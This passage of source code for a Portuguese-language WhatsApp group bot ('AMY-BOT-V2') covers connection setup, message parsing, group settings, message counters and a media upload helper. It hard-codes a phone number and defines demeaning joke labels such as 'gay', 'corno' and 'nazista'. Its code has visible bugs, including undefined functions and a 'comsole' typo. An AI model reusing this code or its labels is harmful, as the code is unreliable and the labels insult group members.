require("./dono.js")
const { 
default:
makeWASocket, 
downloadContentFromMessage,
generateWAMessageContent,
generateWAMessageFromContent,
makeCacheableSignalKeyStore,
StylePrivWaFromMessage,
delay,
useMultiFileAuthState,
BufferJSON,
proto,
close,
prepareWAMessageMedia, 
MediaType,
MessageType,
ChatModification,
DisconnectReason,
relayWAMessage,
fetchLatestBaileysVersion,
WASocket,
Browsers,
EyeWaSocket,
makeInMemoryStore,
}
= require('@whiskeysockets/baileys');
const webp_mp4 = require("./arquivos/lib/webp_mp4.js");
const { getRandom} = require('./arquivos/funções/myfunc.js');
const { exec } = require("child_process")
const totalcmd = "787"
const chalk = require('chalk');
const FileType = require('file-type')
const { runtime } = require("./arquivos/myfunc")
const color = (text, color) => { return !color ? chalk.green(text) : chalk.keyword(color)(text) };
let pino = require('pino')
const fs = require('fs')
const PhoneNumber = require('awesome-phonenumber')
const cfonts = require('cfonts')
const axios = require('axios');
const infoSystem = require('os')
const NodeCache = require('node-cache')
const readline = require('readline')
const util = require("util")
const path = require("path")
const fetch = require('node-fetch');
const speed = require('performance-now')
const moment = require('moment-timezone');
const ffmpeg = require('fluent-ffmpeg');
const mimetype = require("mime-types")
const BodyForm = require("form-data")
const { Boom }  = require('@hapi/boom');
const crypto = require('crypto');
const encodeUrl = require('encodeurl');
const cheerio = require('cheerio');
const { MultiDownload } = require('./arquivos/multidl.js');
const { getBuffer, getGroupAdmins,} = require('./datab/myfunc');
const { ytvdl, yts, ytadl, cleanup } = require("lordxdd");
const { emoji2 } = require ('./settings.json')
const registrar = JSON.parse(fs.readFileSync('./arquivos/registro/registros.json'));
// † by adm crician 🤡
const simih = JSON.parse(fs.readFileSync('./arquivos/usuarios/simi.json'));
const samih2 = JSON.parse(fs.readFileSync('./arquivos/funções/simi.json'));

const premium = JSON.parse(fs.readFileSync('./Premiums/usuarios/premium.json'));
const antiporn = JSON.parse(fs.readFileSync('./arquivos/antis/antiporn.json'));
const { conselhob } = require('./arquivos/funções/conselhob.js');
const modobn = JSON.parse(fs.readFileSync('./arquivos/grupos/brincadeiras.json'));
const antiflood = JSON.parse(fs.readFileSync('./arquivos/usuarios/antiflood.json'));
const limitefll = JSON.parse(fs.readFileSync('./arquivos/usuarios/flood.json'));
const registros = JSON.parse(fs.readFileSync('./arquivos/registro/registros.json'));
const antifake = JSON.parse(fs.readFileSync('./arquivos/antis/antifake.json'));
const nescessario = JSON.parse(fs.readFileSync('./arquivos/nescessario.json'));
const antisticker = JSON.parse(fs.readFileSync('./arquivos/antis/antisticker.json'))
const countMessage = JSON.parse(fs.readFileSync('./arquivos/grupos/countmsg.json'));
const antinotas = JSON.parse(fs.readFileSync('./arquivos/antis/antinotas.json'))
const antipv = JSON.parse(fs.readFileSync('./arquivos/usuarios/antipv.json'))
const adeuscara = JSON.parse(fs.readFileSync('./arquivos/grupos/adeuscara.json'));
const autoreact = JSON.parse(fs.readFileSync('./arquivos/funções/autoreact.json'))
const muted = JSON.parse(fs.readFileSync('./database/usuarios/muted.json'))

const { tabela } = require('./arquivos/grupos/tabela');
var { verificado } = require("./settings/nescessario.json")

const { 
getExtension, Random, 
getFileBuffer,
} = require("./loli/browser/get.js")

const API_KEY_SHIPPUDEN = "SHIPPUDEN"
const API_KEY_SHADOW = "apikey-do-flexa"
const API_KEY_SABRINA = "api-do_flexa"
const API_KEY_DANIEL = "daniel-api3"
const API_KEY_ZEROTWO = "key-_do_lucas-lima_";
const API_CARIFLEX = "cariflex-key"


const { fetchJson } = require('./arquivos/funções.js');

const { palavras } = require('./arquivos/lib/conselhos.js');

//† Global donos  minhas
donoName = global.donoName
botName = global.botName
donoNumber = global.donoNumber
numeroBot = global.numeroBot
prefix = global.prefix
// 
function kyun(seconds){
function pad(s){ return (s < 10 ? '0' : '') + s;}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos` }
const convertBytes = function(bytes) {
const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
if (bytes == 0) {
return "n/a"
}
const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
if (i == 0) {
return bytes + " " + sizes[i]
}
return (bytes / Math.pow(1024, i)).toFixed(1) + " " + sizes[i]
}

//// DATA E HORA PIKEMON
data = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const msgRetryCounterCache = new NodeCache();


async function ligarbot() {
let phoneNumber = "5596991084987"
const store = makeInMemoryStore({ logger: pino().child({ level: 'debug', stream: 'store' }) })
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))

//╸╸╸╸╸╸╸╸╸╸╸ 𝘿𝘼𝙏𝘼 𝙀 𝙃𝙊𝙍𝘼 ╸╸╸╸╸╸╸╸╸╸╸╸

data = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

const { state, saveCreds } = await useMultiFileAuthState('./datab/qr-code')
const { version, isLatest} = await fetchLatestBaileysVersion();
//╸╸╸╸╸╸╸╸╸╸╸╸╸ 𝘾𝙊𝙉𝙀𝙓𝙊̃𝙀𝙎 ╸╸╸╸╸╸╸╸╸╸╸╸
const amy = makeWASocket({
  logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode,
      mobile: useMobile,
      browser: ['Chrome (Linux)'],
     auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
      },
      browser: ['Chrome (Linux)', '', ''],
      markOnlineOnConnect: true,
      generateHighQualityLinkPreview: true,
      getMessage: async (key) => {
         let jid = jidNormalizedUser(key.remoteJid)
         let msg = await store.loadMessage(jid, key.id)

         return msg?.message || ""
      },
      msgRetryCounterCache,
      defaultQueryTimeoutMs: undefined,
   })
//╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸
//╸╸╸╸╸╸╸╸╸╸╸╸╸ 𝙂𝙀𝙍𝘼𝙍 𝘾𝙊́𝘿𝙄𝙂𝙊𝙎 ╸╸╸╸╸╸╸╸╸╸╸╸╸
if (pairingCode && !amy.authState.creds.registered) {
console.log(`${chalk.redBright("Coloque o número de whatsapp. Exemplo: +5596991542453")}:`);
let phoneNumber = await question(`   ${chalk.cyan("- Número")}: `);
phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

let code = await amy.requestPairingCode(phoneNumber);
code = code?.match(/.{1,4}/g)?.join("-") || code;
console.log(` 🥶 ${chalk.redBright("Seu código")}:`);
console.log(`   ${chalk.cyan("- Código")}: ${code}`);
rl.close();
}

const banner = cfonts.render(("AMY|BOT"), {
font: "block",
align: "center",
colors: [`cyan`,`white`,`cyan`],
})

amy.ev.on('creds.update', saveCreds);
store.bind(amy.ev)
amy.ev.on("chats.set", () => {
console.log("Tem conversas", store.chats.all())
})
amy.ev.on("contacts.set", () => {
console.log("Tem contatos", Object.values(store.contacts))
})
amy.ev.on("connection.update", (update) => {
const { connection, lastDisconnect } = update
if(connection === "close") {
const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut
console.log("Conexão fechada devido a", lastDisconnect.error, "Tentando reconectar...", shouldReconnect);
if(shouldReconnect) {
startBase()
}
} else if(connection === "open") {
console.log(banner.string)
console.log(`${color(`${botName} AMY-BOT-V2 Conectada com sucesso ✓ `,'cyan')}`)
}
})

amy.ev.on('contacts.set', () => {
console.log('setando contatos...')
})

amy.ev.on('creds.update', saveCreds)

amy.ev.on('messages.upsert', async ({ messages }) => {
try {
//=============funções
const info = m = messages[0]
if (!info.message) return 

const key = {
    remoteJid: info.key.remoteJid,
    id: info.key.id, 
    participant: info.key.participant 
}
await amy.readMessages([key])

if (info.key && info.key.remoteJid == 'status@broadcast') return
const altpdf = Object.keys(info.message)
const type = altpdf[0] == 'senderKeyDistributionMessage' ? altpdf[1] == 'messageContextInfo' ? altpdf[2] : altpdf[1] : altpdf[0]

type_message = JSON.stringify(info.message)

const isQuotedImage = type === "extendedTextMessage" && type_message.includes("imageMessage")
const from = m.chat = info.key.remoteJid

// Deletar Arquivos:
function DLT_FL(file) {
try {
fs.unlinkSync(file);
} catch (error) {
}
}
//╸╸╸╸╸╸╸╸╸╸╸╸ 𝘽𝙐𝘿𝙔 ╸╸╸╸╸╸╸╸╸╸╸╸╸
////========
const budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var Procurar_String = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || ""

//╸╸╸╸╸╸╸╸╸╸╸ 𝘽𝙊𝘿𝙔 ╸╸╸╸╸╸╸╸╸╸╸╸╸╸
var body = type === "conversation" ? info.message.conversation : type === "viewOnceMessageV2" ? info.message.viewOnceMessageV2.message.imageMessage ? info.message.viewOnceMessageV2.message.imageMessage.caption : info.message.viewOnceMessageV2.message.videoMessage.caption : type === "imageMessage" ? info.message.imageMessage.caption : type === "videoMessage" ? info.message.videoMessage.caption : type === "extendedTextMessage" ? info.message.extendedTextMessage.text : type === "viewOnceMessage" ? info.message.viewOnceMessage.message.videoMessage ? info.message.viewOnceMessage.message.videoMessage.caption : info.message.viewOnceMessage.message.imageMessage.caption : type === "documentWithCaptionMessage" ? info.message.documentWithCaptionMessage.message.documentMessage.caption : type === "buttonsMessage" ? info.message.buttonsMessage.imageMessage.caption : type === "buttonsResponseMessage" ? info.message.buttonsResponseMessage.selectedButtonId : type === "listResponseMessage" ? info.message.listResponseMessage.singleSelectReply.selectedRowId : type === "templateButtonReplyMessage" ? info.message.templateButtonReplyMessage.selectedId : type === "groupInviteMessage" ? info.message.groupInviteMessage.caption : type === "pollCreationMessageV3" ? info.message.pollCreationMessageV3 : type === "interactiveResponseMessage" ? JSON.parse(info.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : type === "text" ? info.text : ""           
////========
 
const content = JSON.stringify(info.message);
const isCmd = body.startsWith(prefix)

const isGroup = from.endsWith("@g.us")

const menc_jid2 = info.message?.extendedTextMessage?.contextInfo?.mentionedJid

//╸╸╸╸╸╸╸╸╸╸╸ 𝙍𝙀𝙉𝘿𝙀𝙍 𝘿𝙀 𝙅𝙊𝙂𝙊 ╸╸╸╸╸╸╸╸╸╸╸╸
gayzin = gayzão
fein = feião 
matei = mateii
cornin = cornão
bonita = bonitinha 
gada = gadinha
vesgin = vesgão
bebin = bebão
gadin = gadão
gostosin = gostosão
gostosinha = gostosona 
hitler = nazista
tapinha = tapão
beijin = beijão
chutin = chutão
dancinha = dança 
casalzin = casar
fiel = fielzao
soquin = socão 
infiel = infielzin
By = "AMY-BOT-V2"

//╸╸╸╸╸╸╸╸╸╸╸ 𝙁𝙐𝙉𝘾̧𝙊̃𝙀𝙎 𝘿𝙀 𝙂𝙍𝙐𝙋𝙊 ╸╸╸╸╸╸╸╸╸╸╸╸



const dirGroup = `./arquivos/grupos/${from}.json`;

const nescj = "./dono/nescessario.json";

const data_IDGP = [{
groupId: from,
x9: false, 
antisticker: false,
antiloc: false,
antifake: false, 

Odelete: false, 
antispam: false, 
antinotas: false, 
sistemGold: false,
visuUnica: false, 
registrarFIGUS: false,
soadm: false,
rg_aluguel: false,
listanegra: [], 
advertir: [], 
prefixos: ["!"],
advertir2: [], 
legenda_estrangeiro: "0",
legenda_documento: "0",
 legenda_video: "0",
legenda_imagem: "0", 
multiprefix: false, 
forca_ofc: [{acertos: 0, erros: 0, palavra: [], escreveu: [], palavra_ofc: 0, dica: 0, tema: 0}],
minerar_gold: [], ausentes: [], forca_inc: false, 
antipalavrao: {
active: false,
palavras: []
},
limitec: {
active: false,
quantidade: null
},
wellcome: [{
bemvindo1: true,
legendabv: "Olá #numerodele#, seja bem vindo (a)",
legendasaiu: 0
},
{
bemvindo2: false,
legendabv: "Olá #numerodele#, seja bem vindo (a)",
legendasaiu: 0
}],
simih1: false, simi2: false,
autosticker: false, autoresposta: false,
jogos: false, level: false,
bangp: false, nsfw: false
}];

if(isGroup && !fs.existsSync(dirGroup)){
fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP, null, 2) + '\n');
}
try {
var dataGp = isGroup ? JSON.parse(fs.readFileSync(dirGroup)) : undefined;
} catch (e){
fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP));
}

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + '\n')}
function setNes(index){
fs.writeFileSync(nescj, JSON.stringify(index, null, 2))}

/////=================
const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
const sender = isGroup ? info.key.participant: from
const sendPoll = (jid, name = '', values = [], selectableCount = 1) => { 
amy.sendMessage(jid, { poll: { name, values, selectableCount }}) 
}
const command = comando = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null
const nome = pushName = info.pushName ? info.pushName: botName 
const pushname = info.pushName ? info.pushName : ""

const groupMetadata = isGroup ? await amy.groupMetadata(from): ""
const participants = isGroup ? await groupMetadata.participants : ''
const groupName = isGroup  ? groupMetadata.subject: ""
const groupDesc = isGroup ? groupMetadata.desc : ''
const isX9VisuUnica = isGroup ? dataGp[0].visuUnica : undefined
 const isx9 = isGroup ? dataGp[0].x9 : undefined

const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

const args = body.trim().split(/ +/).splice(1)
const q = text = args.join(' ')
const So_Adm = isGroup ? dataGp[0].soadm: undefined
const IS_sistemGold = isGroup ? dataGp[0].sistemGold : undefined
const criador = `${donoNumber}@s.whatsapp.net`
const numeroBot = amy.user.id.split(":")[0]+"@s.whatsapp.net"
const isCreator = criador.includes(sender)
const isAdmins = groupAdmins.includes(sender) || false 
const isBotAdmins = groupAdmins.includes(numeroBot) || false
const isPremium = premium.includes(sender)
const TOKEN_GPT = nescessario.TOKEN_GPT

const adivinha = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'iPhone' : 'WhatsApp Web';

    amy.sendImage = async (jid, path, caption = '', quoted = '', options) => {
	let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await amy.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
 
  
const cfonts = require("cfonts")
const chalk = require("chalk")
const axios = require("axios")
const fetch = require("node-fetch")
const mimetype = require("mime-types")
const FormData = require("form-data")
const { fromBuffer } = require("file-type")

var corzinhas = ["white"]
var corzinhas1 = ["red"]
var corzinhas2 = ["white"]
const cor1 = corzinhas[Math.floor(Math.random() * (corzinhas.length))]	
const cor2 = corzinhas1[Math.floor(Math.random() * (corzinhas1.length))]	
const cor3 = corzinhas2[Math.floor(Math.random() * (corzinhas2.length))]	




const getBuffer = (url, options) => new Promise(async (resolve, reject) => { 
options ? options : {}
await axios({method: "get", url, headers: {"DNT": 1, "Upgrade-Insecure-Request": 1}, ...options, responseType: "arraybuffer"}).then((res) => {
resolve(res.data)
}).catch(reject)
})



const getExtension = async (type) => {
	return await mimetype.extension(type)
}

const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`;
}

function upload(midia) {
  return new Promise(async (resolve, reject) => {
    try {
      let { ext } = await fromBuffer(midia);
      let form = new FormData();
      form.append('reqtype', 'fileupload');
      form.append('fileToUpload', midia, 'tmp.' + ext);

      await fetch('https://catbox.moe/user/api.php', {
        method: 'POST',
        body: form
      })
      .then(response => response.text())
      .then(link => {
        resolve(link.trim());
      })
      .catch(erro => reject(erro));
    } catch (erro) {
      return console.log(erro);
    }
  });
}




//********************************************//
const groupIdscount = []
const numbersIds = []
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.id)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./arquivos/grupos/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
id: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./arquivos/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
} else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
id: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./arquivos/grupos/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
function isRegistrado(id) {
    return registrar.some(usuario => usuario.id === id);
}
var { fundo1, fundo2, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, deathcmd, beijocmd, chutecmd, tapacmd, rnkgay, rnkgado, rnkcorno, rnkgostoso, rnkgostosa, rnknazista, rnkotaku, rnkpau, suruba, sococmd, espancarcmd, comercmd, paucmd, forcacmd, lavarcmd, rnkfreefire, farparcmd, rnkxitado, rnklacre, rnkfalido, rnkpunheteiro, minado_bomb, thumbnail } = require("./tznaftkk/links_img.json");
var { dono1 } = require("./settings/nescessario.json");
const numerodono = [`${dono1}@s.whatsapp.net`]
const { mensagens } = require('./arquivos/funções/aleatoria.js');

var texto_exato = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

var replymen = mensagens[Math.floor(Math.random() * mensagens.length)] 

const texto = texto_exato.slice(0).trim().split(/ +/).shift().toLowerCase()

async function escrever (texto) {
await amy.sendPresenceUpdate('composing', from) 
await esperar(3000)   
amy.sendMessage(from, { text: texto }, {quoted: info})
}
const VRF_JSON_GRUPO = fs.existsSync(`./database/grupos/activation_gp/${from}.json`) ? true : false;

if(VRF_JSON_GRUPO) {
var jsonGp = JSON.parse(fs.readFileSync(`./database/grupos/activation_gp/${from}.json`));
}

if(VRF_JSON_GRUPO && jsonGp[0].x9 && info.messageStubType){
switch(info.messageStubType){
case 29:
await delay(1000);
amy.sendMessage(info.key.remoteJid, {text: `*@${info.messageStubParameters[0].split("@")[0]}* foi promovido(a) ao cargo de adminstrador do grupo por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 5000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
break;
case 30:
await delay(1000);
amy.sendMessage(info.key.remoteJid, {text: `O(a) adminstrador(a) *@${info.messageStubParameters[0].split("@")[0]}* foi rebaixado(a) à membro comum por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 5000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
break;
}}

async function instagramDl(url) { // by hiudy
  const { instagram } = require("nayan-media-downloader");
  comsole.log(instagram)
  try {
    let URL = await instagram(url); 
    return {video: [...URL.data.video], foto: [...URL.data.images]};
  } catch (error) {
    console.error("Erro ao tentar baixar a mídia do Instagram:", error);
    return [];
  }
}

async function iniciandoDown() {
  const carregamento = [
    `*🔥 Carregando...*\n*《 ❤️▒▒▒▒▒▒▒▒▒》10%*`,
    `*🔥 Carregando...*\n*《 💛█▒▒▒▒▒▒▒▒》20%*`,
    `*🔥 Carregando...*\n*《 💙████▒▒▒▒▒》40%*`,
    `*🔥 Carregando...*\n*《 💜█████▒▒▒▒》50%*`,
    `*🔥 Carregando...*\n*《 💚██████▒▒》70%*`,
    `*🔥 Carregando...*\n*《 💖████████▒》80%*`,
    `*🔥 Carregando...*\n*《 ❤️█████████》90%*`,
    `*💖 CARREGAMENTO COMPLETO!* 💖`,
  ];

  const { key } = await amy.sendMessage(from, {
    text: '🔥 INICIANDO CARREGAMENTO... 🔥',
  });

  for (let i = 0; i < carregamento.length; i++) {
    await amy.sendMessage(from, {
      text: carregamento[i],
      edit: key,
    });
    await new Promise((resolve) => setTimeout(resolve, 2000));
  }
}

async function iniciando2Down() {
var carregamento = [
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 █▒▒▒▒▒▒▒▒▒》10%*`,
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 ██▒▒▒▒▒▒▒▒》20%*`,
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 ████▒▒▒▒▒▒》40%*`,
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 █████▒▒▒▒▒》50%*`,
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 ███████▒▒▒》70%*`,
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 ████████▒▒》80%*`,
` *𝑩𝑨𝑰𝑿𝑨𝑵𝑫𝑶 𝑰𝑴𝑨𝑮𝑬𝑵𝑺...*\n*《 █████████▒》90%*`,
`  🎨 𝑰𝑴𝑨𝑮𝑬𝑵𝑺 𝑩𝑨𝑰𝑿𝑨𝑫𝑨𝑺 🎨
`
] 
let { key } = await amy.sendMessage(from, {text: '𝑰𝑵𝑰𝑪𝑰𝑨𝑵𝑫𝑶 𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫𝑺'})

for (let i = 0; i < carregamento.length; i++) {
await amy.sendMessage(from, {text: carregamento[i], edit: key });
}
}

async function baixarDown() {
var download = [
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘▒▒▒▒▒▒▒▒▒▒〙0%`,
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘█▒▒▒▒▒▒▒▒▒〙10%`,
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘███▒▒▒▒▒▒▒〙35%`,
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘█████▒▒▒▒▒〙51%`,
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘███████▒▒▒〙62%`,
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘████████▒▒〙80%`,
`▧⃯⃟𝙴𝚗𝚟𝚒𝚊𝚗𝚍𝚘 𝚂𝚞𝚊 𝙼ú𝚜𝚒𝚌𝚊ฺ͘.•🛸 ݈݇─
ʟᴏᴀᴅɪɴɢ〘██████████〙100%`,
`~_*© 𝙰𝚖𝚢 𝚋𝚘𝚝 𝚘𝚏𝚒𝚌𝚒𝚊𝚕*_~
𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳...`
]
let { key } = await amy.sendMessage(from, {text: `\`\`\`🔎 buscando música 🔍\`\`\``})

for (let i = 0; i < download.length; i++) {
await amy.sendMessage(from, {text: download[i], edit: key });
}
}

async function FOTOPLAY() {
try {
var cricianfoto = await amy.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image');
} catch(e) {
cricianfoto = 'https://telegra.ph/file/b5d494f35df464680649c.jpg';
}
}


async function askQuestion(from, pergunta, opcoes) {
  const mensagem = await amy.sendMessage(from, {text: pergunta}, {quoted: info})
  const botao = []
  for (let i = 0; i < opcoes.length; i++) {
    botao.push({text: opcoes[i], command: `${prefix}opcao ${i+1}`})
  }
  const buttonMessage = {
    text: pergunta,
    footer: 'Selecione uma opção',
    buttons: botao,
    headerType: 1
  }
  await amy.sendMessage(from, buttonMessage, {quoted: mensagem}).catch(e => { reagir(from, "❌") })

  const resposta = await waitForMessage(from, 30000)
  if (!resposta) return null

  const opcao = resposta.text.match(/\/opcao (\d+)/)
  if (!opcao) return null

  return opcoes[parseInt(opcao[1]) - 1]
}

// Função waitForMessage
async function waitForMessage(from, tempo) {
  return new Promise(resolve => {
    const timeout = setTimeout(() => {
      resolve(null)
    }, tempo)

    amy.on('message', mensagem => {
      if (mensagem.from == from) {
        clearTimeout(timeout)
        resolve(mensagem)
      }
    })
  })
}


const min = JSON.parse(fs.readFileSync('./sandroft/edite/fotos.json'))
megu = min.megumax

const reply = (texto) => {
amy.sendMessage(from, { text: texto }, {quoted: info})
}
          
const esperar = sleep = async (tempo) => {
    return new Promise(funcao => setTimeout(funcao, tempo));
}


const msgSemQuoted = (content, type, options = {}) => {
   const isFullUrl = (url) => new RegExp(/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)$/, 'gi').test(url);
const mediaKeys = ['image', 'video', 'sticker', 'audio', 'document', 'history', 'md-app-state'];
options[type || 'text'] = isFullUrl(content) && mediaKeys.includes(type) ? {url: content}: content;
return amy.sendMessage(from, options, {quoted: info}).catch(e => {
reply("Erro ao reply a mensagem..");
})
}

// PRA LIMPAR DO CONTADOR QUEM NÃO ESTÁ NO GRUPO
async function LIMPARDOCNT_QUEMJASAIU() {
var RD_CNT = countMessage[countMessage.map(i => i.groupId).indexOf(from)].numbers
CNT1 = []; for ( i of groupMembers) {CNT1.push(i.id)} 
CNT = []; for ( i of RD_CNT) {
if(!CNT1.includes(i.id)) CNT.push(i)}
for ( i of CNT) {
RD_CNT.splice(RD_CNT.map(i => i.id).indexOf(i.id), 1)}
fs.writeFileSync("./arquivos/countmsg.json", JSON.stringify(countMessage, null, 2))
}

const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: info.key
}
} 
amy.sendMessage(idgp, reactionMessage)
}

const mencionarIMG = (teks= '', Url, ms) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
amy.sendMessage(from, {image: {url: Url}, caption: teks.trim(), mentions: memberr}, {quoted: info}) 
}



const mention = (teks= '', ms = info) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
amy.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: info}) 
}
const GroupsMutedActived = []
for(let obj of muted) {
    GroupsMutedActived.push(obj.jid)
}
const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
if(isMuted && NumbersMuted.indexOf(sender) >= 0){
reply(`😡 Você deu um piu ?🐥 - Agora prepare-se para o seu julgamento hehe!`)
setTimeout(async () => {
    amy.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
return
}
//================//isquoted/const
const isImage = type == 'imageMessage'
const isVideo = type == 'videoMessage'
const isAudio = type == 'audioMessage'
const isSticker = type == 'stickerMessage'
const isContact = type == 'contactMessage'
const isLocation = type == 'locationMessage'
const isProduct = type == 'productMessage'
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
typeMessage = body.substr(0, 50).replace(/\n/g, '')
if (isImage) typeMessage = "Image"
else if (isVideo) typeMessage = "Video"
else if (isAudio) typeMessage = "Audio"
else if (isSticker) typeMessage = "Sticker"
else if (isContact) typeMessage = "Contact"
else if (isLocation) typeMessage = "Location"
else if (isProduct) typeMessage = "Product"

